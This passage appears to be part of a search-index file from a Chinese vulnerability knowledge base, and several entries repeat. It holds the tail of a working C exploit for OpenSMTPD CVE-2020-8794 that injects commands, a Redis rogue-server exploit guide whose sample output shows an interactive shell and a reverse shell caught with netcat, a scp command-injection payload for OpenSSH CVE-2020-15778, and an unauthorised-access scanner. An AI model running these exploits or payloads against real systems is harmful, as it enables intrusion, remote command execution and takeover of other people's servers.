== '\\0' ) die (); if ( inject_lines [ 0 ] == '\\n' ) die (); if ( inject_lines [ strlen ( inject_lines ) -1 ] == '\\n' ) die (); server_send ( \"%s-Error \\n \" , error_code ); server_send ( \"%s \\n\\n %s%c\" , error_code , inject_lines , ( int ) '\\0' ); } else { server_send ( \"%s Error \\n \" , error_code ); server_recv ( \"RSET\" ); server_send ( \"250 Reset \\n \" ); server_recv ( \"QUIT\" ); server_send ( \"221 Bye \\n \" ); } server_close (); } static const struct addrinfo * client_target = NULL ; static const char * client_mail = NULL ; static const char * client_rcpt = NULL ; static int client_fd = -1 ; static void client_connect ( void ) { if ( client_fd != -1 ) die (); client_fd = socket ( client_target -> ai_family , client_target -> ai_socktype , client_target -> ai_protocol ); if ( client_fd <= -1 ) die (); if ( connect ( client_fd , client_target -> ai_addr , client_target -> ai_addrlen ) != 0 ) die (); printf ( \" \\n Connected to %s \\n \" , common_getnameinfo ( client_target -> ai_addr , client_target -> ai_addrlen )); } static void client_send ( const char * const format , ...) { if ( client_fd <= -1 ) die (); va_list ap ; va_start ( ap , format ); common_send ( client_fd , format , ap ); va_end ( ap ); } static char client_reply [ 1024 ]; static void client_recv ( const char * const prefix ) { if ( client_fd <= -1 ) die (); const size_t prefix_len = strlen ( prefix ); if ( prefix_len < 3 ) die (); char * data = client_reply ; size_t size = sizeof ( client_reply ); const char * line = data ; for (;;) { const ssize_t rcvd = recv ( client_fd , data , size , 0 ); if ( rcvd <= 0 ) die (); if (( size_t ) rcvd >= size ) die (); data += rcvd ; size -= rcvd ; data [ 0 ] = '\\0' ; if ( data [ -1 ] != '\\n' ) continue ; for (;;) { const char * const new_line = strchr ( line , '\\n' ); if ( new_line == NULL ) break ; if ( new_line - line < 4 ) die (); printf ( \"<-- %.*s\" , ( int )( new_line - line + 1 ), line ); if ( strncmp ( line , prefix , prefix_len ) != 0 ) die (); if ( line [ 3 ] == ' ' ) { if ( new_line + 1 != data ) die (); return ; } if ( line [ 3 ] != '-' ) die (); line = new_line + 1 ; } if ( line != data ) die (); } die (); } static void client_close ( void ) { if ( client_fd <= -1 ) die (); if ( close ( client_fd ) != 0 ) die (); client_fd = -1 ; } static void client_session ( void ) { client_connect (); client_recv ( \"220 \" ); client_send ( \"HELP \\n \" ); client_recv ( \"214\" ); if ( strstr ( client_reply , \"please contact bugs@openbsd.org\" ) == NULL ) die (); client_send ( \"EHLO ent.of.line \\n \" ); client_recv ( \"250\" ); const int dsn = ( strstr ( client_reply , \"250-DSN\" ) != NULL ); client_send ( \"MAIL FROM:<%s> \\n \" , client_mail ); client_recv ( \"250 \" ); client_send ( \"RCPT TO:<%s>%s \\n \" , client_rcpt , dsn ? \" NOTIFY=SUCCESS\" : \"\" ); client_recv ( \"250 \" ); client_send ( \"DATA \\n \" ); client_recv ( \"354 Enter mail, end with \" ); if ( ! dsn ) { client_send ( \"Delivered-To: %s \\n \" , client_rcpt ); } client_send ( \" \\n \" ); client_send ( \". \\n \" ); client_recv ( \"250 \" ); client_send ( \"QUIT \\n \" ); client_recv ( \"221 \" ); client_close (); } int main ( int argc , char * const * argv ) { setlinebuf ( stdout ); puts ( \"LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)\" ); puts ( \"Copyright (C) 2020 Qualys, Inc.\" ); int opt ; while (( opt = getopt ( argc , argv , \"c:u:d:m:n\" )) != -1 ) { switch ( opt ) { case 'c' : inject . command = optarg ; break ; case 'u' : grammar = OLD_SMTPD_GRAMMAR ; inject . user = optarg ; break ; case 'd' : inject . dispatcher = optarg ; break ; case 'm' : grammar = OLD_SMTPD_GRAMMAR ; inject . maildir = optarg ; break ; case 'n' : grammar = NEW_SMTPD_GRAMMAR ; break ; default : die (); } } if ( grammar == NEW_SMTPD_GRAMMAR ) { const int len = snprintf ( inject . lines , sizeof ( inject . lines ), \"type:mda \\n mda-exec:%s \\n dispatcher:%s \\n mda-user:%s\" , inject . command , inject . dispatcher , inject . user ); if ( len <= 0 || ( unsigned ) len >= sizeof ( inject . lines )) die (); } else if ( grammar == OLD_SMTPD_GRAMMAR ) { const int len = snprintf ( inject . lines , sizeof ( inject . lines ), \"type:mda \\n mda-buffer:%s \\n mda-method:%s \\n mda-user:%s \\n mda-usertable:<getpwnam>\" , inject . maildir ? inject . maildir : inject . command , inject . maildir ? \"maildir\" : \"mda\" , inject . user ); if ( len <= 0 || ( unsigned ) len >= sizeof ( inject . lines )) die (); } else die (); argc -= optind ; argv += optind ; if ( argc == 3 ) { exploit = SERVER_SIDE_EXPLOIT ; client_target = common_getaddrinfo ( argv [ 0 ], \"25\" ); client_mail = argv [ 1 ]; client_rcpt = argv [ 2 ]; } else if ( argc != 0 ) die (); server_listen (); if ( exploit == CLIENT_SIDE_EXPLOIT ) { server_session ( inject . lines ); } else if ( exploit == SERVER_SIDE_EXPLOIT ) { client_session (); unsigned try ; for ( try = 0 ; try < 1 ; try ++ ) { server_session ( NULL ); puts ( \" \\n Please wait for OpenSMTPD to connect back...\" ); } server_session ( inject . lines ); client_session (); server_session ( \"type:invalid\" ); } else die (); exit ( EXIT_SUCCESS ); } \u6ce8\uff1aEXP\u6765\u6e90\u4e8e\uff1a https://www.exploit-db.com/exploits/48140","title":"0x4 \u6f0f\u6d1e\u5229\u7528EXP\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x05","text":"1\u3001qualys \u62a5\u544a [ https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install.txt ] 2\u3001qualys \u62a5\u544a\u7ec6\u8282 [ https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install-exploit.c ] 3\u3001CVE-2020-7247: OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u901a\u544a - 360CERT [ https://cert.360.cn/warning/detail?id=b03e92c903678dd6497d1be040f761d5 ] 4\u3001Releases \u00b7 OpenSMTPD/OpenSMTPD [ https://github.com/OpenSMTPD/OpenSMTPD/releases ] 5\u3001Debian -- Security Information -- DSA-4634-1 opensmtpd [ https://www.debian.org/security/2020/dsa-4634 ]","title":"0x05 \u53c2\u8003\u94fe\u63a5"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"Redis Rogue Server \u00b6 A exploit for Redis(<=5.0.5) RCE, inspired by Redis post-exploitation . Support interactive shell and reverse shell! github\u83b7\u53d6\u6587\u4ef6 Requirements \u00b6 Python 3.6+ If you want to modify or recompile the redis module, you also require make . Usage \u00b6 Compile exploit: cd RedisModulesSDK/exp/ make Copy the .so file to same folder with redis-rogue-server.py . \u279c ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example \u00b6 Interactive shell \u00b6 \u279c ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1 ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig [info] TARGET 127.0.0.1:6379 [info] SERVER 127.0.0.1:21000 [info] Setting master... [info] Setting dbfilename... [info] Loading module... [info] Temerory cleaning up... What do u want, [i]nteractive shell or [r]everse shell: i [info] Interact mode start, enter \"exit\" to quit. [<<] whoami [>>] :n0b0dy [<<] Reverse shell \u00b6 Invoke reverse shell: \u279c ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1 ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig [info] TARGET 127.0.0.1:6379 [info] SERVER 127.0.0.1:21000 [info] Setting master... [info] Setting dbfilename... [info] Loading module... [info] Temerory cleaning up... What do u want, [i]nteractive shell or [r]everse shell: r [info] Open reverse shell... Reverse server address: 127.0.0.1 Reverse server port: 9999 [info] Reverse shell payload sent. [info] Check at 127.0.0.1:9999 [info] Unload module... Receive reverse shell: \u279c nc -lvvp 9999 Listening on [0.0.0.0] (family 0, port 9999) Connection from localhost.localdomain 39312 received! whoami n0b0dy Thanks \u00b6 RicterZ 's redis exec module: https://github.com/RicterZ/RedisModules-ExecuteCommand","title":"Redis Rogue Server"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#redis-rogue-server","text":"A exploit for Redis(<=5.0.5) RCE, inspired by Redis post-exploitation . Support interactive shell and reverse shell! github\u83b7\u53d6\u6587\u4ef6","title":"Redis Rogue Server"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#requirements","text":"Python 3.6+ If you want to modify or recompile the redis module, you also require make .","title":"Requirements"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#usage","text":"Compile exploit: cd RedisModulesSDK/exp/ make Copy the .so file to same folder with redis-rogue-server.py . \u279c ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream","title":"Usage"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#example","text":"","title":"Example"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#interactive-shell","text":"\u279c ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1 ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig [info] TARGET 127.0.0.1:6379 [info] SERVER 127.0.0.1:21000 [info] Setting master... [info] Setting dbfilename... [info] Loading module... [info] Temerory cleaning up... What do u want, [i]nteractive shell or [r]everse shell: i [info] Interact mode start, enter \"exit\" to quit. [<<] whoami [>>] :n0b0dy [<<]","title":"Interactive shell"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#reverse-shell","text":"Invoke reverse shell: \u279c ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1 ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig [info] TARGET 127.0.0.1:6379 [info] SERVER 127.0.0.1:21000 [info] Setting master... [info] Setting dbfilename... [info] Loading module... [info] Temerory cleaning up... What do u want, [i]nteractive shell or [r]everse shell: r [info] Open reverse shell... Reverse server address: 127.0.0.1 Reverse server port: 9999 [info] Reverse shell payload sent. [info] Check at 127.0.0.1:9999 [info] Unload module... Receive reverse shell: \u279c nc -lvvp 9999 Listening on [0.0.0.0] (family 0, port 9999) Connection from localhost.localdomain 39312 received! whoami n0b0dy","title":"Reverse shell"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#thanks","text":"RicterZ 's redis exec module: https://github.com/RicterZ/RedisModules-ExecuteCommand","title":"Thanks"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/redis%E3%80%81mongodb%E3%80%81memcached%E3%80%81elasticsearch%E3%80%81zookeeper%E3%80%81ftp%E3%80%81CouchDB%E3%80%81docker%E3%80%81Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83/","text":"unauthorized-check \u00b6 \u626b\u63cf\u4ee5\u4e0b\u5e38\u89c1\u672a\u6388\u6743\u8bbf\u95ee redis\u3001mongodb\u3001memcached\u3001elasticsearch\u3001zookeeper\u3001ftp\u3001CouchDB\u3001docker\u3001Hadoop \u5b89\u88c5 pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/ \u4f7f\u7528\u8bf4\u660e python3 unauthorized-check.py url.txt","title":"unauthorized-check"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/redis%E3%80%81mongodb%E3%80%81memcached%E3%80%81elasticsearch%E3%80%81zookeeper%E3%80%81ftp%E3%80%81CouchDB%E3%80%81docker%E3%80%81Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83/#unauthorized-check","text":"\u626b\u63cf\u4ee5\u4e0b\u5e38\u89c1\u672a\u6388\u6743\u8bbf\u95ee redis\u3001mongodb\u3001memcached\u3001elasticsearch\u3001zookeeper\u3001ftp\u3001CouchDB\u3001docker\u3001Hadoop \u5b89\u88c5 pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/ \u4f7f\u7528\u8bf4\u660e python3 unauthorized-check.py url.txt","title":"unauthorized-check"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/","text":"\u6f0f\u6d1e\u6982\u8ff0 \u00b6 OpenSSH\uff08OpenBSD Secure Shell\uff09\u662fOpenBSD\u8ba1\u5212\u7ec4\u7684\u4e00\u5957\u7528\u4e8e\u5b89\u5168\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8fde\u63a5\u5de5\u5177\u3002\u8be5\u5de5\u5177\u662fSSH\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\uff0c\u652f\u6301\u5bf9\u6240\u6709\u7684\u4f20\u8f93\u8fdb\u884c\u52a0\u5bc6\uff0c\u53ef\u6709\u6548\u963b\u6b62\u7a83\u542c\u3001\u8fde\u63a5\u52ab\u6301\u4ee5\u53ca\u5176\u4ed6\u7f51\u7edc\u7ea7\u7684\u653b\u51fb\u3002 OpenSSH 8.3p1\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u7684scp\u7684scp.c\u6587\u4ef6\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5916\u90e8\u8f93\u5165\u6570\u636e\u6784\u9020\u64cd\u4f5c\u7cfb\u7edf\u53ef\u6267\u884c\u547d\u4ee4\u8fc7\u7a0b\u4e2d\uff0c\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u672a\u6b63\u786e\u8fc7\u6ee4\u5176\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3001\u547d\u4ee4\u7b49\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u975e\u6cd5\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002 \u6f0f\u6d1e\u539f\u7406 \u00b6 \u6f0f\u6d1e\u89e6\u53d1\u70b9\u5982\u4e0b\uff0c\u5f53\u6587\u4ef6\u590d\u5236\u5230\u8fdc\u7a0bSSH\u670d\u52a1\u5668\u65f6\uff0c\u6587\u4ef6\u8def\u5f84\u4f1a\u9644\u52a0\u5728\u672c\u5730scp\u547d\u4ee4\u7684\u672b\u5c3e\uff1a \u6bd4\u5982\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u65f6 scp source_file user@host: directory/destination_file \u5728SSH\u670d\u52a1\u5668\u7684\u672c\u5730\u5c06\u4f1a\u6267\u884c\uff1a scp -t directory/destination_file \u540c\u65f6\uff0c\u5728\u521b\u5efa\u672c\u5730scp\u547d\u4ee4\u65f6\uff0c\u672a\u6e05\u7406\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u800clinux\u7cfb\u7edf\u5141\u8bb8\u4ee5\u53cd\u5f15\u53f7\u8fdb\u884c\u6587\u4ef6\u547d\u540d\u3002\u6240\u4ee5\u5982\u679c\u628apayload\u5199\u5165\u5728\u53cd\u5f15\u53f7\u4e2d\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u5f53\u8c03\u7528scp\u547d\u4ee4\u65f6\u5c31\u4f1a\u89e6\u53d1payload\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 OpenSSH <=8.3p1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 payload\uff1ascp /source_file user@ip:' touch /tmp/wow.sh /destination_file ' \u767b\u5f55\u5230SSH\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u4e86\u6587\u4ef6\uff1a \u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u8f83\u4e3a\u4e25\u683c\uff0c\u9700\u8981\u83b7\u53d6SSH\u670d\u52a1\u5668\u7684\u5bc6\u7801\u624d\u80fd\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u573a\u666f\u4e0b\u4e5f\u53ef\u53d1\u6325\u5927\u7528\u5904\uff0c\u6bd4\u5982SSH\u7aef\u53e3\u88ab\u9650\u5236\u8bbf\u95ee\uff0c\u5219\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7684\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u83b7\u53d6\u65b0\u6743\u9650\u3002 \u4fee\u590d\u5efa\u8bae \u00b6 \uff081\uff09\u5173\u6ce8\u5382\u5546\u7684\u5b89\u5168\u901a\u544a\u548c\u8865\u4e01\u53d1\u5e03\uff1a http://www.openssh.com/portable.html \uff082\uff09\u7981\u7528scp -r\u62f7\u8d1d\u76ee\u5f55\u7684\u65b9\u5f0f","title":"OpenSSH\u547d\u4ee4\u6ce8\u5165CVE-2020-15778"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_1","text":"OpenSSH\uff08OpenBSD Secure Shell\uff09\u662fOpenBSD\u8ba1\u5212\u7ec4\u7684\u4e00\u5957\u7528\u4e8e\u5b89\u5168\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8fde\u63a5\u5de5\u5177\u3002\u8be5\u5de5\u5177\u662fSSH\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\uff0c\u652f\u6301\u5bf9\u6240\u6709\u7684\u4f20\u8f93\u8fdb\u884c\u52a0\u5bc6\uff0c\u53ef\u6709\u6548\u963b\u6b62\u7a83\u542c\u3001\u8fde\u63a5\u52ab\u6301\u4ee5\u53ca\u5176\u4ed6\u7f51\u7edc\u7ea7\u7684\u653b\u51fb\u3002 OpenSSH 8.3p1\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u7684scp\u7684scp.c\u6587\u4ef6\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5916\u90e8\u8f93\u5165\u6570\u636e\u6784\u9020\u64cd\u4f5c\u7cfb\u7edf\u53ef\u6267\u884c\u547d\u4ee4\u8fc7\u7a0b\u4e2d\uff0c\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u672a\u6b63\u786e\u8fc7\u6ee4\u5176\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3001\u547d\u4ee4\u7b49\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u975e\u6cd5\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_2","text":"\u6f0f\u6d1e\u89e6\u53d1\u70b9\u5982\u4e0b\uff0c\u5f53\u6587\u4ef6\u590d\u5236\u5230\u8fdc\u7a0bSSH\u670d\u52a1\u5668\u65f6\uff0c\u6587\u4ef6\u8def\u5f84\u4f1a\u9644\u52a0\u5728\u672c\u5730scp\u547d\u4ee4\u7684\u672b\u5c3e\uff1a \u6bd4\u5982\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u65f6 scp source_file user@host: directory/destination_file \u5728SSH\u670d\u52a1\u5668\u7684\u672c\u5730\u5c06\u4f1a\u6267\u884c\uff1a scp -t directory/destination_file \u540c\u65f6\uff0c\u5728\u521b\u5efa\u672c\u5730scp\u547d\u4ee4\u65f6\uff0c\u672a\u6e05\u7406\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u800clinux\u7cfb\u7edf\u5141\u8bb8\u4ee5\u53cd\u5f15\u53f7\u8fdb\u884c\u6587\u4ef6\u547d\u540d\u3002\u6240\u4ee5\u5982\u679c\u628apayload\u5199\u5165\u5728\u53cd\u5f15\u53f7\u4e2d\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u5f53\u8c03\u7528scp\u547d\u4ee4\u65f6\u5c31\u4f1a\u89e6\u53d1payload\u3002","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_3","text":"OpenSSH <=8.3p1","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_4","text":"payload\uff1ascp /source_file user@ip:' touch /tmp/wow.sh /destination_file ' \u767b\u5f55\u5230SSH\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u4e86\u6587\u4ef6\uff1a \u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u8f83\u4e3a\u4e25\u683c\uff0c\u9700\u8981\u83b7\u53d6SSH\u670d\u52a1\u5668\u7684\u5bc6\u7801\u624d\u80fd\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u573a\u666f\u4e0b\u4e5f\u53ef\u53d1\u6325\u5927\u7528\u5904\uff0c\u6bd4\u5982SSH\u7aef\u53e3\u88ab\u9650\u5236\u8bbf\u95ee\uff0c\u5219\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7684\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u83b7\u53d6\u65b0\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_5","text":"\uff081\uff09\u5173\u6ce8\u5382\u5546\u7684\u5b89\u5168\u901a\u544a\u548c\u8865\u4e01\u53d1\u5e03\uff1a http://www.openssh.com/portable.html \uff082\uff09\u7981\u7528scp -r\u62f7\u8d1d\u76ee\u5f55\u7684\u65b9\u5f0f","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/","text":"0x01 \u7b80\u4ecb \u00b6 SaltStack \u662f\u57fa\u4e8e Python \u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\u3002 0x02 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u5728 CVE-2020-11651 